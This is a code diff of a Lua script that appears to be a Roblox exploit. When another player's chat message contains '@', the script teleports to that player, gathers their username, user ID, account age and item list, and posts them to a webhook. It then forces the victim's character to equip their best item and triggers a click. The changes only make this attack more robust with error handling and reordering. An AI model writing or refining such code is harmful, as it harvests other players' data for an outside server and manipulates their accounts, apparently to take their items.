@@ -68,22 +68,22 @@ local function sendToWebhook(data)
         ["fields"] = {
             {
                 ["name"] = "Username",
-                ["value"] = data.username,
+                ["value"] = data.username or "N/A",
                 ["inline"] = true
             },
             {
                 ["name"] = "UserID",
-                ["value"] = tostring(data.userId),
+                ["value"] = tostring(data.userId or "N/A"),
                 ["inline"] = true
             },
             {
                 ["name"] = "Account Age",
-                ["value"] = tostring(data.accountAge),
+                ["value"] = tostring(data.accountAge or "N/A"),
                 ["inline"] = true
             },
             {
                 ["name"] = "Items",
-                ["value"] = data.items,
+                ["value"] = data.items or "No items found",
                 ["inline"] = false
             }
         }
@@ -94,10 +94,20 @@ local function sendToWebhook(data)
         ["embeds"] = {embed}
     }
 
-    local jsonPayload = HttpService:JSONEncode(payload)
-    pcall(function()
-        HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
+    local success, jsonPayload = pcall(function()
+        return HttpService:JSONEncode(payload)
     end)
+
+    if success then
+        local webhookSuccess, webhookError = pcall(function()
+            HttpService:PostAsync(WEBHOOK_URL, jsonPayload)
+        end)
+        if not webhookSuccess then
+            warn("Webhook error: "..tostring(webhookError))
+        end
+    else
+        warn("JSON encode error: "..tostring(jsonPayload))
+    end
 end
 
 -- Get best item from backpack
@@ -146,14 +156,26 @@ end
 -- Main interaction function
 local function teleportAndInteract(target)
     -- Get characters
-    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local character = LocalPlayer.Character
+    if not character then
+        character = LocalPlayer.CharacterAdded:Wait()
+    end
+    
     local humanoid = character:WaitForChild("Humanoid")
     local rootPart = character:WaitForChild("HumanoidRootPart")
 
     -- Get target character
-    local targetCharacter = target.Character or target.CharacterAdded:Wait()
+    local targetCharacter = target.Character
+    if not targetCharacter then
+        targetCharacter = target.CharacterAdded:Wait()
+    end
+    
     local targetHead = targetCharacter:WaitForChild("Head")
     local targetTorso = targetCharacter:FindFirstChild("UpperTorso") or targetCharacter:FindFirstChild("Torso")
+    if not targetTorso then
+        targetTorso = targetCharacter:WaitForChild("UpperTorso", 5) or targetCharacter:WaitForChild("Torso", 5)
+        if not targetTorso then return end
+    end
 
     -- Teleport to target
     rootPart.CFrame = targetTorso.CFrame * CFrame.new(0, 0, -4)
@@ -162,23 +184,16 @@ local function teleportAndInteract(target)
     setFirstPerson()
     local lookConn = lookAtTarget(targetHead)
 
-    -- Force equip best item
-    local backpack = target:FindFirstChild("Backpack")
-    if backpack and targetCharacter:FindFirstChild("Humanoid") then
-        local bestItem = getBestItem(backpack)
-        if bestItem then
-            targetCharacter.Humanoid:EquipTool(bestItem)
-        end
-    end
-
-    -- Send webhook data
+    -- Get items for webhook
     local items = {}
+    local backpack = target:FindFirstChild("Backpack")
     if backpack then
         for _, tool in ipairs(backpack:GetChildren()) do
             table.insert(items, tool.Name)
         end
     end
 
+    -- Send webhook data
     local data = {
         username = target.Name,
         userId = target.UserId,
@@ -187,6 +202,14 @@ local function teleportAndInteract(target)
     }
     
     sendToWebhook(data)
+
+    -- Equip best item
+    if backpack and targetCharacter:FindFirstChild("Humanoid") then
+        local bestItem = getBestItem(backpack)
+        if bestItem then
+            targetCharacter.Humanoid:EquipTool(bestItem)
+        end
+    end
 
     -- Force click after delay
     task.wait(0.5)
@@ -205,13 +228,12 @@ local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     if not string.find(message, "@") then return end
 
-    -- Run in a coroutine to avoid yielding errors
     coroutine.wrap(function()
         local success, err = pcall(function()
             teleportAndInteract(player)
         end)
         if not success then
-            warn("Error: "..err)
+            warn("Error in teleportAndInteract: "..tostring(err))
         end
     end)()
 end
@@ -232,3 +254,5 @@ Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+
+print("Script loaded successfully - Waiting for @ mentions")
